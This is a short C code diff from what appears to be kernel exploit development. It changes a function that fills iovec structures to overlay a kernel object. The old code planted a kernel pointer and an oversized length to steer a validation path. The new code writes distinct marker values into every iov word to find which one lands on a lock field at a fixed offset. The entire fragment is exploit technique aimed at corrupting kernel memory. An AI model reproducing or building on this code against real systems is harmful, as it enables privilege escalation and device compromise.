@@ -252,10 +252,15 @@ static void overlay_fill_iovec(struct iovec *iv, int n, int base_word) {
      so validation dies there (seg 6's huge len would trigger the
      EINVAL path which sanitizes the stack array). */
   (void)base_word;
-  iv[13 / 2].iov_base = (void *)0x10;           /* harmless user addr */
-  iv[13 / 2].iov_len = overlay_word_value(7);   /* W->lock (huge len) */
-  iv[5].iov_base = (void *)0xffffffc000000000ULL; /* kernel ptr -> EFAULT here */
-  iv[5].iov_len = 8;
+  /* MARKER SWEEP: every iov word gets a distinct tag (kk = word index).
+     The walk's x24 (W->lock) will reveal which word lands on W+0x38. */
+  for (int j = 0; j < 2 * n; j++) {
+    uint64_t marker = 0x5300000000000000ULL | ((uint64_t)j << 8);
+    if (j & 1)
+      iv[j / 2].iov_len = marker;
+    else
+      iv[j / 2].iov_base = (void *)marker;
+  }
 }
 
 static void overlay_fill_words(char *buf, size_t bytes, int base_word) {
